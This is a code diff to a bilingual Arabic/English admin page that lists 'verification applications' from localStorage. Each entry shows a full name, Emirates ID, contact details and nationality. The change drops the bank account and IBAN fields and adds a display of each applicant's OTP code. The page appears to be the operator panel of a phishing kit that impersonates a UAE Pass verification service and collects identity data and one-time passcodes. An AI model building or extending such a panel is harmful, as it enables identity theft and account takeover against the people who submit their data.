@@ -733,31 +733,10 @@
         let currentFilter = 'all';
         let searchQuery = '';
 
-        // Load applications from our data management system
+        // Load applications from localStorage
         function loadApplications() {
-            const stored = localStorage.getItem('allSubmissions');
-            const rawApplications = stored ? JSON.parse(stored) : [];
-            
-            // Transform our data structure to match admin page expectations
-            applications = rawApplications.map(app => ({
-                id: app.sessionId,
-                fullName: app.uaePassData?.fullName || 'N/A',
-                emiratesId: app.uaePassData?.emiratesId || 'N/A',
-                email: app.uaePassData?.email || 'N/A',
-                mobileNumber: app.uaePassData?.phone || 'N/A',
-                nationality: app.uaePassData?.nationality || 'N/A',
-                bankName: app.bankInfo?.bankName || 'N/A',
-                accountNumber: app.bankInfo?.accountNumber || 'N/A',
-                iban: app.bankInfo?.iban || 'N/A',
-                status: app.status === 'pending_bank_info' ? 'pending' : 
-                       app.status === 'pending_approval' ? 'pending' : 
-                       app.status,
-                timestamp: app.timestamp,
-                submittedAt: app.submittedAt,
-                hasUAEPass: !!app.uaePassData,
-                hasBankInfo: !!app.bankInfo
-            }));
-            
+            const stored = localStorage.getItem('verificationApplications');
+            applications = stored ? JSON.parse(stored) : [];
             updateStats();
             renderApplications();
         }
@@ -853,17 +832,12 @@
                 email: 'البريد الإلكتروني',
                 mobile: 'رقم الجوال',
                 nationality: 'الجنسية',
-                bankName: 'اسم البنك',
-                accountNumber: 'رقم الحساب',
-                iban: 'رقم الآيبان',
+                otp: 'رمز OTP',
                 status: 'الحالة',
                 submissionDate: 'تاريخ التقديم',
-                completedDate: 'تاريخ الاكتمال',
                 notProvided: 'غير متوفر',
                 approve: '✓ موافقة',
-                reject: '✗ رفض',
-                uaePassSection: 'معلومات UAE Pass',
-                bankInfoSection: 'معلومات البنك'
+                reject: '✗ رفض'
             } : {
                 appId: 'Application ID',
                 fullName: 'Full Name',
@@ -871,17 +845,12 @@
                 email: 'Email',
                 mobile: 'Mobile Number',
                 nationality: 'Nationality',
-                bankName: 'Bank Name',
-                accountNumber: 'Account Number',
-                iban: 'IBAN',
+                otp: 'OTP Code',
                 status: 'Status',
                 submissionDate: 'Submission Date',
-                completedDate: 'Completed Date',
                 notProvided: 'Not provided',
                 approve: '✓ Approve',
-                reject: '✗ Reject',
-                uaePassSection: 'UAE Pass Information',
-                bankInfoSection: 'Bank Information'
+                reject: '✗ Reject'
             };
 
             const modalBody = document.getElementById('modalBody');
@@ -890,12 +859,6 @@
                     <label>${labels.appId}</label>
                     <div class="value">${app.id}</div>
                 </div>
-                <div class="detail-row">
-                    <label>${labels.status}</label>
-                    <div class="value"><span class="status ${app.status}">${app.status.toUpperCase()}</span></div>
-                </div>
-                
-                <h3 style="margin-top: 20px; margin-bottom: 15px; color: #00a99d;">${labels.uaePassSection}</h3>
                 <div class="detail-row">
                     <label>${labels.fullName}</label>
                     <div class="value">${app.fullName}</div>
@@ -916,34 +879,18 @@
                     <label>${labels.nationality}</label>
                     <div class="value">${app.nationality || labels.notProvided}</div>
                 </div>
-                
-                ${app.hasBankInfo ? `
-                <h3 style="margin-top: 20px; margin-bottom: 15px; color: #00a99d;">${labels.bankInfoSection}</h3>
                 <div class="detail-row">
-                    <label>${labels.bankName}</label>
-                    <div class="value">${app.bankName}</div>
+                    <label>${labels.otp}</label>
+                    <div class="value">${app.otp || 'N/A'}</div>
                 </div>
                 <div class="detail-row">
-                    <label>${labels.accountNumber}</label>
-                    <div class="value">${app.accountNumber}</div>
+                    <label>${labels.status}</label>
+                    <div class="value"><span class="status ${app.status}">${app.status.toUpperCase()}</span></div>
                 </div>
-                <div class="detail-row">
-                    <label>${labels.iban}</label>
-                    <div class="value">${app.iban}</div>
-                </div>
-                ` : `<p style="margin-top: 20px; color: #999; font-style: italic;">${currentLanguage === 'ar' ? 'لم يتم إدخال معلومات البنك بعد' : 'Bank information not yet provided'}</p>`}
-                
                 <div class="detail-row">
                     <label>${labels.submissionDate}</label>
                     <div class="value">${new Date(app.timestamp).toLocaleString()}</div>
                 </div>
-                ${app.submittedAt ? `
-                <div class="detail-row">
-                    <label>${labels.completedDate}</label>
-                    <div class="value">${new Date(app.submittedAt).toLocaleString()}</div>
-                </div>
-                ` : ''}
-                
                 ${app.status === 'pending' ? `
                 <div class="action-buttons">
                     <button class="btn btn-approve" onclick="updateStatus('${app.id}', 'approved')">${labels.approve}</button>
@@ -957,41 +904,21 @@
 
         // Update application status
         function updateStatus(id, status) {
-            // Get the verification data
-            const dataStr = localStorage.getItem('verification_' + id);
-            if (!dataStr) {
-                alert('Verification not found');
-                return;
-            }
-            
-            const verificationData = JSON.parse(dataStr);
-            verificationData.status = status;
-            verificationData.statusUpdatedAt = new Date().toISOString();
-            if (status === 'approved') {
-                verificationData.approvedAt = new Date().toISOString();
-            } else if (status === 'rejected') {
-                verificationData.rejectedAt = new Date().toISOString();
-            }
-            
-            // Update individual record
-            localStorage.setItem('verification_' + id, JSON.stringify(verificationData));
-            
-            // Update in allSubmissions
-            let allSubmissions = JSON.parse(localStorage.getItem('allSubmissions') || '[]');
-            const index = allSubmissions.findIndex(s => s.sessionId === id);
+            const index = applications.findIndex(a => a.id === id);
             if (index !== -1) {
-                allSubmissions[index] = verificationData;
-                localStorage.setItem('allSubmissions', JSON.stringify(allSubmissions));
+                applications[index].status = status;
+                applications[index].statusUpdatedAt = new Date().toISOString();
+                localStorage.setItem('verificationApplications', JSON.stringify(applications));
+                
+                loadApplications();
+                closeModal();
+                
+                const message = currentLanguage === 'ar' 
+                    ? (status === 'approved' ? 'تمت الموافقة على الطلب بنجاح!' : 'تم رفض الطلب بنجاح!')
+                    : `Application ${status === 'approved' ? 'approved' : 'rejected'} successfully!`;
+                
+                alert(message);
             }
-            
-            loadApplications();
-            closeModal();
-            
-            const message = currentLanguage === 'ar' 
-                ? (status === 'approved' ? 'تمت الموافقة على الطلب بنجاح!' : 'تم رفض الطلب بنجاح!')
-                : `Application ${status === 'approved' ? 'approved' : 'rejected'} successfully!`;
-            
-            alert(message);
         }
 
         // Close modal
